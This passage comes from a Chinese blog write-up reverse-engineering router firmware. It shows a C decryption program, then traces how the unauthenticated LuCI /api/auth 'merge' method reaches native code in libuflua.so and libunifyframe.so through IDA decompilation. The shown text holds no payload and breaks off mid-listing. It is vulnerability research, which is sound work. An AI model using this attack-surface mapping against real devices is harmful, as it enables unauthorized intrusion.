class="number">1</span>]);</span><br><span class="line">	<span class="built_in">strcat</span>(dec_path, <span class="string">&quot;.decrypted&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat_buf</span>;</span></span><br><span class="line">	<span class="type">int</span> stat_fd = stat(enc_path, &amp;stat_buf);</span><br><span class="line">	<span class="keyword">if</span> (stat_fd &lt; <span class="number">0</span>) error_msg(<span class="string">&quot;The encrypted firmware does not exist !&quot;</span>);</span><br><span class="line">	<span class="type">int</span> size = stat_buf.st_size;</span><br><span class="line">	</span><br><span class="line">	<span class="type">uint8_t</span> *enc_buf = (<span class="type">uint8_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="type">uint8_t</span> *dec_buf = (<span class="type">uint8_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> enc_fd = open(enc_path, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span> (enc_fd &lt; <span class="number">0</span>) error_msg(<span class="string">&quot;Error to open the encrypted firmware !&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> dec_fd = open(dec_path, O_WRONLY | O_CREAT, S_IREAD | S_IWRITE | S_IRGRP);</span><br><span class="line">	<span class="keyword">if</span> (dec_fd &lt; <span class="number">0</span>) error_msg(<span class="string">&quot;Error to create the decrypted firmware !&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (read(enc_fd, enc_buf, <span class="number">22</span>) != <span class="number">22</span>) error_msg(<span class="string">&quot;Error to read from the encrypted firmware !&quot;</span>);</span><br><span class="line">	size -= <span class="number">22</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(size &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> len = size;</span><br><span class="line">		<span class="keyword">if</span> (size &gt; <span class="number">0x1000</span>) len = <span class="number">0x1000</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">memset</span>(enc_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(enc_buf));</span><br><span class="line">		<span class="built_in">memset</span>(dec_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(dec_buf));</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (read(enc_fd, enc_buf, len) != len) error_msg(<span class="string">&quot;Error to read from the encrypted firmware !&quot;</span>);</span><br><span class="line">		decrypt(enc_buf, dec_buf, len);</span><br><span class="line">		<span class="keyword">if</span> (write(dec_fd, dec_buf, len) != len) error_msg(<span class="string">&quot;Error to write into the decrypted firmware !&quot;</span>);</span><br><span class="line">		size -= len;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(enc_buf);</span><br><span class="line">	<span class="built_in">free</span>(dec_buf);</span><br><span class="line">	close(enc_fd);</span><br><span class="line">	close(dec_fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果仔细研究下解密脚本能够发现，固件异或的 <code>key</code> 并不是一直为 <code>0x7f</code> ，在最初的几轮异或中 <code>key</code> 是在变化的，<code>key</code> 经过几轮迭代后才变成了固定的 <code>0x7f</code> ，好在没有影响到后面的文件系统的完整性。</p>
<h2 id="lua文件的调用链分析"><a href="#lua文件的调用链分析" class="headerlink" title="lua文件的调用链分析"></a>lua文件的调用链分析</h2><p>在 <code>/usr/lib/</code> 路径下存在一个 <code>lua</code> 目录，其中存放了很多 <code>lua</code> 文件。主要作用是对前端传入的数据做了一些简单处理和判断，然后将数据传递给二进制文件进一步处理</p>
<p> <code>/usr/lib/lua/luci/controller/eweb/api.lua</code> 文件中，配置了路由 <code>entry(&#123;&quot;api&quot;, &quot;auth&quot;&#125;, call(&quot;rpc_auth&quot;), nil).sysauth = false</code></p>
<p>这意味着当用户访问 <code>/api/auth</code> 路径时，将调用 <code>rpc_auth</code> 函数。在 <code>luci</code> 框架中 <code>sysauth</code> 属性控制是否需要系统级的用户认证才能访问该路由，这里的 <code>sysauth</code> 属性为 <code>false</code> ，表示无需进行系统认证即可访问。</p>
<p><code>rpc_auth</code> 函数首先引入了一些模块（代码如下），然后获取 <code>HTTP_CONTENT_LENGTH</code> 的长度是否大于 <code>1000</code> 字节，如果不大于的话会将准备 <code>HTTP</code> 响应的类型设置为 <code>application/json</code> ，下面的 <code>handle</code> 函数第一个参数 <code>_tbl</code> 传入的是 <code>luci.modules.noauth</code> 文件返回的内容，变量类型为 <code>table</code> （该 <code>table</code> 包含了 <code>noauth</code> 文件中定义的四个函数 <code>login</code> <code>singleLogin</code> <code>merge</code> <code>checkNet</code>）</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_auth</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">tonumber</span>(http.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_CONTENT_LENGTH&quot;</span>) <span class="keyword">or</span> <span class="number">0</span>) &gt; <span class="number">1000</span> <span class="keyword">then</span></span><br><span class="line">        http.prepare_content(<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">        <span class="comment">-- http.write(&#123;code = &quot;1&quot;, err = &quot;too long data&quot;&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;too long data&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http.prepare_content(<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.<span class="built_in">write</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>下面分析 <code>luci.utils.jsonrpc</code> 文件中的 <code>handle</code> 函数，它主要是把参数 <code>tbl</code> 以及报文中的 <code>method</code> 字段传入给了 <code>resolve</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(tbl, rawsource, ...)</span></span></span><br><span class="line">......</span><br><span class="line">    <span class="keyword">if</span> stat <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(json.method) == <span class="string">&quot;string&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> method = resolve(tbl, json.method)</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">then</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, proxy(method, json.params <span class="keyword">or</span> &#123;&#125;))</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p><code>resolve</code> 函数的作用跟它的名字一样，来解析出 <code>method</code> 字段对应的函数（报文中写成 <code>&quot;method&quot;: &quot;merge&quot;</code> 具体的原因 <strong>winmt</strong> 师傅<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h3_1">文章</a> 中写的很清楚），通过遍历 <code>mod</code> （表中存储了四种方法），然后通过 <code>rawget</code>  获取表中键为 <code>path[j]</code> （也就是 <code>merge</code> ）的值并赋值给 <code>mod</code> ，此时 <code>mod</code> 就表示 <code>noauth.lua</code> 文件中的 <code>merge</code> 函数 </p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">(mod, method)</span></span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">path</span> = luci.util.split(method, <span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j = <span class="number">1</span>, #<span class="built_in">path</span> - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="built_in">mod</span> = <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[j])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">mod</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">mod</span> = <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[#<span class="built_in">path</span>]) <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;function&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mod</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>发现代码 <code>proxy(method, json.params or &#123;&#125;)</code> ，这表示 <code>merge</code> 函数作为参数传入给了 <code>proxy</code> 中，这里的 <code>method</code> 又传入了 <code>luci.util</code> 文件中的 <code>copcall</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy</span><span class="params">(method, ...)</span></span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> res = &#123;luci.util.copcall(method, ...)&#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p><code>copcall</code> 函数主要是对 <code>coxpcall</code> 的一个封装</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copcall</span><span class="params">(f, ...)</span></span></span><br><span class="line">	<span class="keyword">return</span> coxpcall(f, copcall_id, ...)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>终于在 <code>coxpcall</code> 函数内部发现调用了 <code>f</code> ，<code>oldpcall(coroutine.create, f)</code> 这行代码的目的是在一个新的协程中运行函数 <code>f</code> ，因此执行到这里 <code>merge</code> 函数被触发</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">coxpcall</span><span class="params">(f, err, ...)</span></span></span><br><span class="line">	<span class="keyword">local</span> res, co = oldpcall(<span class="built_in">coroutine</span>.<span class="built_in">create</span>, f)</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>下面开始分析 <code>merge</code> 函数（本篇文章只能算是对 <strong>winmt</strong> 师傅写的文章进行一个补充，这里不介绍为什么是调用 <code>merge</code> 函数而不是调用其他函数，就是因为在 <strong>winmt</strong> 师傅写的 <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-277386.htm">文章</a> 中已经对这部分进行了详细的介绍），该函数的内部调用了 <code>luci.modules.cmd</code> 文件中的 <code>devSta.set</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;device = <span class="string">&quot;pc&quot;</span>, <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>, data = params, async = <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>这个 <code>devSta.set</code> 函数的定义如下，先是调用了 <code>doParams</code> 函数对 <code>json</code> 数据进行解析，随后调用了 <code>fetch</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    params.method = opt[i]</span><br><span class="line">    params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">    <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>这个 <code>fetch</code> 函数在 <code>cmd.lua</code> 文件中已经定义了，这里调用了 <code>fn</code> 也就是 <code>fetch</code> 函数传入进来的 <code>model.fetch</code></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(fn, shell, params, ...)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _start = <span class="built_in">os</span>.<span class="built_in">time</span>()</span><br><span class="line">    <span class="keyword">local</span> _res = fn(...)</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p> <code>model</code> 是 <code>dev_sta</code> 文件的返回结果，因此 <code>model.fetch</code> 实际上是 <code>dev_sta</code> 文件中的 <code>fetch</code> 函数，该函数定义如下，能够看到最后是调用了 <code>/usr/lib/lua/libuflua.so</code> 文件中的 <code>client_call</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(cmd, module, param, back, ip, password, force, not_change_configId, multi)</span></span></span><br><span class="line">    <span class="keyword">local</span> uf_call = <span class="built_in">require</span> <span class="string">&quot;libuflua&quot;</span></span><br><span class="line">......</span><br><span class="line">    <span class="keyword">local</span> stat = uf_call.client_call(ctype, cmd, <span class="built_in">module</span>, param, back, ip, password, force, not_change_configId, multi)</span><br><span class="line">    <span class="keyword">return</span> stat</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>用 <code>IDA</code> 打开 <code>/usr/lib/lua/libuflua.so</code> 文件，并没有看到定义的 <code>client_call</code> 函数，不过发现了 <code>uf_client_call</code> 函数，猜测是程序内部进行了关联。<code>shift+f12</code> 搜索字符串发现并没有看到字符串 <code>client_call</code> （如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513243.png" alt="image-20230822105021327"></p>
<p>大概率说明 <code>IDA</code> 没有把 <code>client_call</code> 解析成字符串，而是解析成了代码。我这里用 <code>010Editor</code> 打开该文件进行搜索字符串 <code>client_call</code>，成功搜索到后发现其地址位于 <code>0xff0</code> 处</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513988.png" alt="image-20230822105722385" style="zoom:67%;" />



<p>可以看到 <code>IDA</code> 确实是将 <code>0xff0</code> 位置的数据当做了代码来解析，选中这部分数据，按 <code>a</code> ，就能以字符串的形式呈现了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513739.png" alt="image-20230822105929868"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513124.png" alt="image-20230822110053012"></p>
<p>对字符串 <code>client_call</code> 进行交叉引用，发现最终调用位置如下，<code>luaL_register</code> 是 <code>Lua</code> 中注册 <code>C</code> 语言编写的函数，它作用是将 <code>C</code> 函数添加到一个 <code>Lua</code> 模块中，使得这些 <code>C</code> 函数能够从 <code>Lua</code> 代码中被调用</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513757.png" alt="image-20230822111240902"></p>
<p>该函数的原型如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">luaL_register</span> <span class="params">(lua_State *L, <span class="type">const</span> <span class="type">char</span> *libname, <span class="type">const</span> luaL_Reg *l)</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>lua_State *L</code>：<code>Lua</code> 状态指针，代表了一个 <code>Lua</code> 解释器实例。</li>
<li><code>const char *libname</code>：模块的名称，这个名称会在 <code>Lua</code> 中作为一个全局变量存在，存放模块的函数。</li>
<li><code>const luaL_Reg *l</code>：一个结构体数组，包含要注册到模块中的函数的信息。每个结构体包含函数的名称和相应的 <code>C</code> 函数指针</li>
</ul>
<p>这里重点关注第三个参数，这就说明 <code>0x1101C</code> 的位置存放的是一个字符串以及一个函数指针（如下图），因此判断出 <code>client_call</code> 实际就定义在了 <code>sub_A00</code> 中</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513875.png" alt="image-20230822111950548"></p>
<p><code>sub_A00</code> 函数定义如下，可以看到最后是调用了 <code>uf_client_call</code> 函数，而在这之前的很多赋值操作如 <code>*(_DWORD *)(v3 + 12) = lua_tolstring(a1, 4, 0);</code> ，很容易能猜测到其实是在解析 <code>Lua</code> 传入的各个参数字段。在 <code>Lua</code> 的代码中 <code>uf_call.client_call(ctype, cmd, module, param, back, ip, password, force, not_change_configId, multi)</code> 这里传入了多个参数，但是 <code>sub_A00</code> 函数就一个参数 <code>a1</code> ，结合的操作分析出这里是在解析参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_A00</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">52</span>);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="number">52</span>);</span><br><span class="line">    v5 = <span class="number">4</span>;</span><br><span class="line">    *(_DWORD *)v3 = luaL_checkinteger(a1, <span class="number">1</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">4</span>) = luaL_checklstring(a1, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    v6 = luaL_checklstring(a1, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">    v7 = *(_DWORD *)v3;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">8</span>) = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v3 + <span class="number">12</span>) = lua_tolstring(a1, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">41</span>) = lua_toboolean(a1, <span class="number">5</span>) == <span class="number">1</span>;</span><br><span class="line">      v5 = <span class="number">6</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">20</span>) = lua_tolstring(a1, v5, <span class="number">0</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">24</span>) = lua_tolstring(a1, v5 + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    v8 = v5 + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)v3 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = v5 + <span class="number">3</span>;</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      v8 = v5 + <span class="number">4</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">44</span>) = lua_toboolean(a1, v5 + <span class="number">3</span>) == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(v3 + <span class="number">48</span>) = lua_toboolean(a1, v8) == <span class="number">1</span>;</span><br><span class="line">    v4 = uf_client_call(v3, v13, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">......    </span><br></pre></td></tr></table></figure>

<p><code>uf_client_call</code> 函数是一个引用外部库的函数，用 <code>grep</code> 在整个文件系统搜索字符串 <code>uf_client_call</code> ，结合 <code>/usr/lib/lua/libuflua.so</code> 文件中引用的外部库进行分析，最终判断出 <code>uf_client_call</code> 函数定义在 <code>/usr/lib/libunifyframe.so</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513373.png" alt="image-20230822132450393"></p>
<p>用 <code> IDA</code> 对 <code>/usr/lib/libunifyframe.so</code> 文件进行分析，看到 <code>uf_client_call</code> 函数首先判断了 <code>method</code> 的类型，然后解析出报文中各字段的值，并将其键值对添加到一个 <code>JSON</code> 对象中，接着将最终处理好的 <code>JSON</code> 对象转换为 <code>JSON</code> 格式的字符串，通过 <code>uf_socket_msg_write</code> 用 <code>socket</code> 套接字进行数据传输</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">uf_client_call</span><span class="params">(_DWORD *a1, <span class="type">int</span> a2, <span class="type">int</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  v5 = json_object_new_object();</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">switch</span> ( *a1 )<span class="comment">//这里的*a1指的就是uf_call.client_call函数的第一个参数ctype,他取决于method它在dev_sta.lua文件中被赋值为了2</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      v15 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">10</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;acConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      v14 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">11</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;devConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      v8 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;devSta.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      v16 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;devCap.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      v17 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">7</span>;</span><br><span class="line">......</span><br><span class="line">LABEL_22:<span class="comment">//接下来使用了大量的json_object_object_add函数，该函数的作用是在已有的JSON对象中添加一个键值对，以json_object_object_add(v20, &quot;remoteIp&quot;, v23)函数为例，作用是将&#123;&quot;remote&quot;,v23&#125;这个键值对添加到v20所指的JSON对象中，</span></span><br><span class="line">      json_object_object_add(v5, <span class="string">&quot;method&quot;</span>, v19);</span><br><span class="line">      v20 = json_object_new_object();</span><br><span class="line">......</span><br><span class="line">      v21 = json_object_new_string(a1[<span class="number">2</span>]);</span><br><span class="line">      json_object_object_add(v20, <span class="string">&quot;module&quot;</span>, v21);</span><br><span class="line">      v22 = a1[<span class="number">5</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">      json_object_object_add(v20, <span class="string">&quot;remoteIp&quot;</span>, v23);</span><br><span class="line">LABEL_35:</span><br><span class="line">      v25 = a1[<span class="number">6</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v25 )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = json_object_new_string(v25);</span><br><span class="line">......</span><br><span class="line">        json_object_object_add(v20, <span class="string">&quot;remotePwd&quot;</span>, v26);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( a1[<span class="number">9</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">......</span><br><span class="line">        json_object_object_add(v20, <span class="string">&quot;buf&quot;</span>, v27);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *a1 != <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = *((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">45</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">42</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v30 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v30 )</span><br><span class="line">          &#123;</span><br><span class="line">            v31 = v20;</span><br><span class="line">            v32 = <span class="string">&quot;execute&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">43</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v29 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v29 )</span><br><span class="line">            json_object_object_add(v20, <span class="string">&quot;force&quot;</span>, v29);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">44</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v30 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v30 )</span><br><span class="line">          &#123;</span><br><span class="line">            v31 = v20;</span><br><span class="line">            v32 = <span class="string">&quot;configId_not_change&quot;</span>;</span><br><span class="line">LABEL_56:</span><br><span class="line">            json_object_object_add(v31, v32, v30);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_57:</span><br><span class="line">      v28 = *((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">45</span>);</span><br><span class="line">LABEL_58:</span><br><span class="line">      <span class="keyword">if</span> ( v28 )</span><br><span class="line">      &#123;</span><br><span class="line">        v33 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;from_url&quot;</span>, v33);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">47</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v34 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v34 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;from_file&quot;</span>, v34);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">48</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v35 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v35 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;multi&quot;</span>, v35);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">46</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v36 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v36 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;not_commit&quot;</span>, v36);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( 